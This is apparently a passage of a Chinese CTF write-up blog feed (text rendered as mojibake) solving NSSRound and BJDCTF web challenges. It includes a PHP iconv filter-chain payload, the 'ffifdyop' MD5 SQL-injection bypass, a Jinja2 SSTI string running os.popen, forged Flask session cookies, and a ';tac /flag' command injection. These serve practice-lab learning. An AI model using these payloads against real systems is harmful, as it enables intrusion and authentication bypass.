class="hljs-type">convert</span>.iconv.CP950.UTF<span class="hljs-number">-16</span>BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP949.UTF32BE|<span class="hljs-type">convert</span>.iconv.ISO_69372.CSIBM921|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>OSF00030010|<span class="hljs-type">convert</span>.iconv.CSIBM1008.UTF32BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP-AR.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_4.BIG5HKSCS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP1046.UTF16|<span class="hljs-type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-decode/resource=php://temp<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¾—åˆ°æºç çš„è·¯ç”±äº†ã€‚</p><h2 id="ã€å¾…ã€‘-NSSRound-7-Team-æ–°çš„åšå®¢"><a href="#ã€å¾…ã€‘-NSSRound-7-Team-æ–°çš„åšå®¢" class="headerlink" title="ã€å¾…ã€‘[NSSRound#7 Team]æ–°çš„åšå®¢"></a>ã€å¾…ã€‘[NSSRound#7 Team]æ–°çš„åšå®¢</h2><h2 id="ã€å¾…ã€‘-NSSRound-7-Team-ShadowFlag"><a href="#ã€å¾…ã€‘-NSSRound-7-Team-ShadowFlag" class="headerlink" title="ã€å¾…ã€‘[NSSRound#7 Team]ShadowFlag"></a>ã€å¾…ã€‘[NSSRound#7 Team]ShadowFlag</h2><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://y0n3er.github.io/2023/02/NSSRound-7-Team%E5%A4%8D%E7%8E%B0/#0o0">NSSRound 7 Teamå¤ç° | ChenXun</a></p><p>[<a href="https://blog.csdn.net/weixin_53090346/article/details/128815454">NSSRound#7 Team]Webå­¦ä¹ _[nssround#7 team]æ–°çš„åšå®¢-CSDNåšå®¢</a></p><p>[NSSRound#7_<a href="https://blog.csdn.net/qq_64201116/article/details/128922324">nssround#7 team]0o0-CSDNåšå®¢</a></p><p><a href="https://www.php.net/manual/zh/function.file-get-contents.php">https://www.php.net/manual/zh/function.file-get-contents.php</a></p><p><a href="https://www.php.net/manual/zh/language.variables.external.php#language.variables.external">PHP: æ¥è‡ª PHP ä¹‹å¤–çš„å˜é‡ - Manual</a></p><p><a href="https://www.cnblogs.com/hithub/p/16804708.html">ctfshow web123(php getæˆ–postå˜é‡åä¸­éæ³•å­—ç¬¦è½¬åŒ–ä¸‹åˆ’çº¿) - hithub - åšå®¢å›­</a></p><p><a href="https://hello-ctf.com/hc-tags/web/PHP_features/#0e-bypass">PHP ç‰¹æ€§ - Hello CTF</a></p><p><a href="https://xz.aliyun.com/news/7758">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜-å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.cnblogs.com/GTL-JU/p/17139352.html">NSSCTF-round8&amp;&amp;round7éƒ¨åˆ†é¢˜ç›®å¤ç° - GTL_JU - åšå®¢å›­</a></p><p><a href="https://www.php.net/manual/zh/function.file-get-contents.php">PHP: file_get_contents - Manual</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[BJDCTF 2020]easy_md5</title>
    <link href="/2025/11/06/BJDCTF-2020-easy-md5/"/>
    <url>/2025/11/06/BJDCTF-2020-easy-md5/</url>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF-2020-easy-md5"><a href="#BJDCTF-2020-easy-md5" class="headerlink" title="[BJDCTF 2020]easy_md5"></a>[BJDCTF 2020]easy_md5</h2><p>å› ä¸ºå‰ä¸ä¹…åˆšåšè¿‡ä¸€ä¸ªè®©ä¼ ç‰¹æ®Šmd5å­—ç¬¦ä¸²çš„é¢˜ï¼Œè¿™é“ç¬¬ä¸€å…³ç›´æ¥éšä¾¿ä¼ äº†ä¸ª<code>ffifdyop</code>äº¤å®Œflagä¹ æƒ¯æ€§çœ‹äº†wpå‘ç°ä¼ å‚æ•°æ˜¯æœ‰ä¾æ®çš„ã€‚</p><p>è¿™é‡Œæ³¨æ„åˆ°è¯·æ±‚åŒ…å“åº”å¤´æœ‰ä¸€ä¸ªhintï¼Œæœ‰ä¸ªselectæŸ¥è¯¢è¯­å¥</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-11-06_17-01-14.png" alt="PixPin_2025-11-06_17-01-14"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> â€˜<span class="hljs-keyword">admin</span>â€™ <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span> =md5($pass,ture)<br></code></pre></td></tr></table></figure><p>äº†è§£ä¸€ä¸‹md5å‡½æ•°çš„ç”¨æ³•ï¼Œ</p><p>md5 â€” è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—å€¼ã€‚</p><p>md5(string<code>$string</code>, bool <code>$binary</code> &#x3D; <strong><code>false</code></strong>): string</p><p>ä½¿ç”¨ MD5 æ¶ˆæ¯æ‘˜è¦ç®—æ³•è®¡ç®— <code>string</code> çš„ MD5 æ•£åˆ—å€¼ï¼Œå¹¶è¿”å›è¯¥æ•£åˆ—å€¼ã€‚</p><ul><li><p><code>string</code></p><p>è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</p></li><li><p><code>binary</code></p><p>å¦‚æœå¯é€‰çš„ <code>binary</code> è¢«è®¾ç½®ä¸º **<code>true</code>**ï¼Œé‚£ä¹ˆ md5 æ‘˜è¦å°†ä»¥ 16 å­—ç¬¦é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</p></li></ul><p>é‚£æˆ‘ä»¬éœ€è¦è¾“å…¥passwordçš„md5å€¼ï¼Œè¿™ä¹Ÿå°±ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰äº†è§£åˆ°çš„ä¸‡èƒ½å¯†ç <code>ffifdtop</code></p><p>å®ƒç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c</p><p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code> </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> â€˜<span class="hljs-keyword">admin</span>â€™ <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span> =<span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥é€šè¿‡ä¸‡èƒ½å¯†ç å®ç°ç»•è¿‡äº†ã€‚</p><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://www.cnblogs.com/tqing/p/11852990.html">ffifdyopâ€”â€”ç»•è¿‡ä¸­ä¸€ä¸ªå¥‡å¦™çš„å­—ç¬¦ä¸² - ä½ çŸ¥é“æ˜¯æˆ‘çš„ - åšå®¢å›­</a></p><p><a href="https://www.php.net/manual/zh/function.md5.php">PHP: md5 - Manual</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[NSSCTF Round #13]éƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <link href="/2025/11/04/NSSCTF-Round-13-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/04/NSSCTF-Round-13-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-Round-13-éƒ¨åˆ†é¢˜ç›®å¤ç°"><a href="#NSSCTF-Round-13-éƒ¨åˆ†é¢˜ç›®å¤ç°" class="headerlink" title="[NSSCTF Round #13]éƒ¨åˆ†é¢˜ç›®å¤ç°"></a>[NSSCTF Round #13]éƒ¨åˆ†é¢˜ç›®å¤ç°</h1><p>æ‹–äº†nä¹…çš„äº§ç‰©ï¼Œè¿˜æœ‰ä¸€é“TimeTrceræš‚æ—¶æ²¡å†™æ²¡åç»­è¡¥ä¸Šã€‚</p><h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>æ¯ä¸ªåŠŸèƒ½ç‚¹è¿›å»çœ‹ä¸‹ï¼Œå‘ç°é‡ç½®å¯†ç è¿™é‡Œæœ‰hint,</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">th3f1askisfunny<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-00-59.png" alt="PixPin_2025-10-24_20-00-59"></p><p><strong>Flask</strong> é€šå¸¸æŒ‡çš„æ˜¯ Python çš„ä¸€ä¸ªè½»é‡çº§ Web æ¡†æ¶ï¼Œç”¨æ¥å¿«é€Ÿæ„å»ºç½‘ç«™æˆ–æ¥å£ã€‚<br> åœ¨å®‰å…¨æˆ– CTF ç¯å¢ƒä¸­ï¼Œè¯´â€œFlaské¢˜â€â€œflaskç›¸å…³æ¼æ´â€ä¸€èˆ¬æ˜¯æŒ‡ï¼š</p><ol><li><strong>Jinja2 æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰</strong></li></ol><p>Flask é»˜è®¤ä½¿ç”¨ Jinja2 ä½œä¸ºæ¨¡æ¿å¼•æ“ï¼Œå¦‚æœå¼€å‘è€…å†™äº†è¯¸å¦‚ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">render_template_string</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello &quot;</span> + request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>å°±ä¼šå¯¼è‡´ç”¨æˆ·å¯æ§è¾“å…¥è¢«ç›´æ¥å½“æˆæ¨¡æ¿æ¸²æŸ“ï¼Œä»è€Œé€ æˆ <strong>Server-Side Template Injectionï¼ˆSSTIï¼‰</strong>ã€‚<br> æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ‰§è¡Œä»»æ„ Python ä»£ç ï¼ˆæ¯”å¦‚ <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code>ï¼‰ã€‚</p><ol start="2"><li><strong>Flask Debug Pin ååºåˆ—åŒ– &#x2F; æ§åˆ¶å°åˆ©ç”¨</strong></li></ol><p>å¦‚æœåº”ç”¨å¯ç”¨äº†è°ƒè¯•æ¨¡å¼ <code>app.run(debug=True)</code>ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥å°è¯•é€šè¿‡ Debug PIN è·å–äº¤äº’å¼æ§åˆ¶å°ï¼Œç›´æ¥æ‰§è¡Œä»£ç ã€‚</p><ol start="3"><li><strong>Session ä¼ªé€ </strong></li></ol><p>Flask é»˜è®¤ä½¿ç”¨ç­¾å cookie å­˜å‚¨ session æ•°æ®ï¼Œå¦‚æœå¼€å‘è€…ä½¿ç”¨é»˜è®¤ <code>app.secret_key</code> æˆ–è€…æ³„éœ²äº†å®ƒï¼Œå°±å¯ä»¥ä¼ªé€ ä»»æ„ session å†…å®¹ã€‚</p><ol start="4"><li><strong>Pickle ååºåˆ—åŒ–</strong></li></ol><p>æŸäº› Flask é¢˜ä¼šåœ¨ session æˆ–ä¸Šä¼ ç‚¹ä¸­åˆ©ç”¨ pickle.loads() ååºåˆ—åŒ–å¯¹è±¡ï¼Œå½¢æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><p>æ³¨å†Œå®Œè´¦å·ç™»é™†ä¸€ä¸‹ï¼Œæœ‰ä¸ªgetflagçš„æŒ‰é’®</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-05-46.png" alt="PixPin_2025-10-24_20-05-46"></p><p>ç‚¹å‡»æç¤ºç”¨æˆ·æƒé™ä¸è¶³ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯sessionä¼ªé€ ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-05-55.png" alt="PixPin_2025-10-24_20-05-55"></p><p>ç°åœ¨çš„session:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJwlzjsOwjAMA<span class="hljs-symbol">NC7</span>ZGbwL<span class="hljs-number">47</span>Ty<span class="hljs-number">1</span>RuYgvWlE<span class="hljs-number">6</span>Iu<span class="hljs-number">1</span>OJ-S<span class="hljs-number">3</span>vU_ZccT<span class="hljs-number">7</span>L<span class="hljs-number">9</span>l<span class="hljs-number">5</span>XPMr-mmUrtZHYESZiCgyg<span class="hljs-symbol">npUnGhp4</span>dWqu<span class="hljs-number">0</span>Y<span class="hljs-number">21</span>i-CARik<span class="hljs-number">3</span>p<span class="hljs-meta">o5</span>IhkxMdtBDSbizTkqMq<span class="hljs-name">m14</span>ho-W<span class="hljs-number">1</span>VVrAjSdA<span class="hljs-number">6</span>lDgoohe<span class="hljs-number">0</span>poYMfozFzuyHXG-m-ofH<span class="hljs-number">8</span>xey<span class="hljs-number">3</span>s.aPtrag.EI<span class="hljs-number">5</span>J<span class="hljs-number">72</span>Qg_ucyF<span class="hljs-number">6</span>Rrh<span class="hljs-number">3</span>IoeE<span class="hljs-number">4</span>Z<span class="hljs-number">3</span>R<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>å…ˆè§£ç jwt:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> flask_session_cookie_manager3.<span class="hljs-keyword">py</span> decode -<span class="hljs-keyword">c</span> <span class="hljs-string">&#x27;.eJwlzjsOwjAMANC7ZGbwL47Ty1RuYgvWlE6Iu1OJ-S3vU_ZccT7L9l5XPMr-mmUrtZHYESZiCgygnpUnGhp4dWqu0Y21i-CARik3po5IhkxMdtBDSbizTkqMqm14ho-W1VVrAjSdA6lDgoohe0poYMfozFzuyHXG-m-ofH8xey3s.aPtrag.EI5J72Qg_ucyF6Rrh3IoeE4Z3R8&#x27;</span> -s <span class="hljs-string">&#x27;th3f1askisfunny&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£ç åï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">5724</span>8be<span class="hljs-number">8448603006</span>af53d<span class="hljs-number">1818</span>0a5a27a6e<span class="hljs-number">98369441</span>c072f43d1f6cef30ff1f3a06b<span class="hljs-number">624393</span>6d2f1e567cafeac7f5a665f<span class="hljs-number">0076</span>dc<span class="hljs-number">1290</span>f<span class="hljs-number">064813</span>af4e6e191e<span class="hljs-number">9333</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;_user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;2&#x27;&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸€ä¸‹<code>_user_id</code>å±æ€§ï¼ŒçŒœæµ‹<code>admin</code>çš„<code>_user_id</code>æ˜¯<code>1</code></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;th3f1askisfunny&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;06f231c9009af8bd640aa6c80172276e1653f82e55f8820c4fd4c78e8cc286fb5cde1a80b04b0da6ba3b51ada4097611c50f1c05cfd67346f7e3331a98b1481c&#x27;</span>, <span class="hljs-string">&#x27;_user_id&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¼ªé€ å¥½çš„session:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.eJwlzsENwzAIAMBd_O4DbINxlokAg9Jv0ryq7t5KvQnuXfY84zrK9jrveJT9ucpWgLM29AkwNcUWd1BlF8BR6-BAppZSgyhFKnjP1X1IiHsVTiNfgSpg0A2WsmkzQl3aYQ5GdIJEB_JcPFrnHNFaQ51i2AW9_CL3Fed_g-XzBZsFLu0</span><span class="hljs-selector-class">.aPtuug</span>.f8xySJOdowkfZnQI-FV81UNG24s<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹sessionæ‹¿åˆ°flag:</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-32-49.png" alt="PixPin_2025-10-24_20-32-49"></p><h2 id="NSSRound-13-Basic-ez-factors"><a href="#NSSRound-13-Basic-ez-factors" class="headerlink" title="[NSSRound#13 Basic]ez_factors"></a>[NSSRound#13 Basic]ez_factors</h2><p>é¢˜ç›®æè¿°</p><p>åŸç”Ÿ Linux å› æ•°çˆ†ç ´å·¥å…·ã€‚flagåœ¨æ ¹ç›®å½•</p><p>å®¹æ˜“çœ‹å‡ºï¼Œ2 31 1847æ˜¯114514çš„å› æ•°ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-43-09.png" alt="PixPin_2025-10-24_20-43-09"></p><p>ç½‘å€åé¢&#x2F;factors&#x2F;114514ä½¿ç”¨åˆ†å·<code>;</code>æ¥æ‰§è¡Œå¤šä¸ªå‘½ä»¤,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/factors/114514;<span class="hljs-built_in">tac</span> /flag<br></code></pre></td></tr></table></figure><p>è®°å¾—è¿›è¡Œurlç¼–ç ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_20-53-44.png" alt="PixPin_2025-10-24_20-53-44"></p><p>å‘ç°å¾—åˆ°çš„å†…å®¹åªæœ‰æ•°å­—ï¼Œçœ‹æ¥åº”è¯¥æ˜¯å¯¹å›æ˜¾è¿›è¡Œäº†é™åˆ¶ï¼Œåªèƒ½å›æ˜¾æ•°å­—ï¼Œ</p><p>è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>od</code>å‘½ä»¤æ¥è¯»å–æ–‡ä»¶</p><p><code>od -t d1 /flag </code>æ˜¯ä¸€ä¸ªå‘½ä»¤è¡ŒæŒ‡ä»¤ï¼Œç”¨äºä»¥åè¿›åˆ¶å½¢å¼æ˜¾ç¤º <code>/flag</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p><p>å…·ä½“æ¥è¯´<code>-t</code> å‚æ•°ç”¨äºæŒ‡å®šå±•ç¤ºçš„æ•°æ®æ ¼å¼ï¼Œ<code>d1</code> è¡¨ç¤ºæ¯ä¸ªæ•°å€¼ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥æ˜¾ç¤ºï¼Œå³æŒ‰å­—èŠ‚è¯»å–ã€‚</p><p><code>/flag</code> æ˜¯æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™ä¸ªæŒ‡ä»¤ä¼šè¯»å– <code>/flag</code> æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶ä»¥åè¿›åˆ¶å½¢å¼è¿›è¡Œå±•ç¤ºã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_21-01-19.png" alt="PixPin_2025-10-24_21-01-19"></p><p>æŠŠè¿™äº›åè¿›åˆ¶æ•°å­—ä¾æ¬¡è½¬æˆ ASCII å­—ç¬¦å†æ‹¼èµ·æ¥ï¼Œå°±æ˜¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NSSC</span>&#123;<span class="hljs-number">70240</span>b1e-<span class="hljs-number">0</span>bb1-<span class="hljs-number">4</span>cc7-<span class="hljs-number">84</span>c2-<span class="hljs-number">73</span>b51745e53b&#125;<br></code></pre></td></tr></table></figure><h2 id="NSSRound-13-Basic-flask-jwt-hard"><a href="#NSSRound-13-Basic-flask-jwt-hard" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?(hard)"></a>[NSSRound#13 Basic]flask?jwt?(hard)</h2><p>åœ¨æ‹¿flagè¿™ä¸ªç•Œé¢æœ‰ä¸€ä¸ªè·¯ç”±ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_21-07-33.png" alt="PixPin_2025-10-24_21-07-33"></p><p>ç»™äº†ä¸Šä¸€æ¬¡ç™»å½•çš„æ—¶é—´ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_21-08-01.png" alt="PixPin_2025-10-24_21-08-01"><br>æˆ‘ä»¬ç”¨<code>Flask-Unsign</code>å¯¹cookieè¿›è¡Œè§£å¯†ï¼Œ<br>å‘ç°åˆšå¥½cookieé‡Œæœ‰å¯¹åº”æ­£ç¡®çš„æ—¶é—´ï¼Œéšæ„ä¿®æ”¹sessionæŸ¥çœ‹æŠ¥é”™ï¼Œå¯ä»¥åœ¨è¿™æŸ¥åˆ°<code>secret_key</code>æ˜¯<code>hardgam3_C0u1d_u_f1ndM3????</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">5724</span>8be<span class="hljs-number">8448603006</span>af53d<span class="hljs-number">1818</span>0a5a27a6e<span class="hljs-number">98369441</span>c072f43d1f6cef30ff1f3a06b<span class="hljs-number">624393</span>6d2f1e567cafeac7f5a665f<span class="hljs-number">0076</span>dc<span class="hljs-number">1290</span>f<span class="hljs-number">064813</span>af4e6e191e<span class="hljs-number">9333</span>&#x27;<span class="hljs-punctuation">,</span> &#x27;_user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;2&#x27;<span class="hljs-punctuation">,</span> &#x27;time&#x27;<span class="hljs-punctuation">:</span> dateime.datetime<span class="hljs-punctuation">(</span><span class="hljs-number">2025</span><span class="hljs-punctuation">,</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span> <span class="hljs-number">24</span><span class="hljs-punctuation">,</span> <span class="hljs-number">13</span><span class="hljs-punctuation">,</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> <span class="hljs-number">22</span><span class="hljs-punctuation">,</span> tzifo<span class="hljs-punctuation">=</span>datetime.timezone.utc<span class="hljs-punctuation">)</span>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨<code>flask_session_cookie_manager3</code>æ¥<code>ä¼ªé€ session</code>ï¼Œä½¿<code>_user_id</code>çš„å€¼å˜æˆ<code>1</code></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scilab">flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;hardgam3_C0u1d_u_f1ndM3????&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;57248be8448603006af53d18180a5a27a6e98369441c072f43d1f6cef30ff1f3a06b6243936d2f1e567cafeac7f5a665f0076dc1290f064813af4e6e191e9333&#x27;</span>, <span class="hljs-string">&#x27;_user_id&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJwlzjEOwzAIAMC_MHcAgzHOZyJi<span class="hljs-name">g9</span>rVaaaqf<span class="hljs-number">2</span>-kzrfcB_ZccT<span class="hljs-number">5</span>he<span class="hljs-number">68</span>rHrC_JmxQWxE<span class="hljs-number">7</span>wkRMkRH<span class="hljs-attr">Vs_IkI0</span>OvXpprdGPtIjSwlZQbU<span class="hljs-number">0</span>ckYyYlO-qhRbizzpIUVdvwDB<span class="hljs-number">8</span>tq<span class="hljs-number">6</span>vWRGw<span class="hljs-number">6</span>B<span class="hljs-number">5</span>WOiSp<span class="hljs-name">G7</span>CmhQZ<span class="hljs-number">2</span>iMzPckeu<span class="hljs-name">M9</span>d<span class="hljs-number">8</span>QfH<span class="hljs-number">8</span>xeC<span class="hljs-number">3</span>r.aPuCRg<span class="hljs-number">.2</span>AOscUKFQ<span class="hljs-number">3</span>d_<span class="hljs-symbol">NHrcy1</span>hJkUPx<span class="hljs-number">7</span>jw<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag:</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_21-43-06.png" alt="PixPin_2025-10-24_21-43-06"></p><h2 id="NSSRound-13-Basic-MyWeb"><a href="#NSSRound-13-Basic-MyWeb" class="headerlink" title="[NSSRound#13 Basic]MyWeb"></a>[NSSRound#13 Basic]MyWeb</h2><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-comment">// å†™äº†ä¸ªç½‘é¡µå­˜å‚¨JSONæ•°æ®ï¼Œä½†æ˜¯è¿˜ä¸ä¼šå¤„ç†jsonæ ¼å¼ï¼Œè¿™æ ·å¤„ç†åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å§</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] == <span class="hljs-string">&#x27;save&#x27;</span>) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/tmp/data.json&#x27;</span>);<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;value&#x27;</span>]);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&quot;, &#x27;<span class="hljs-subst">$value</span>&#x27;]&quot;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span 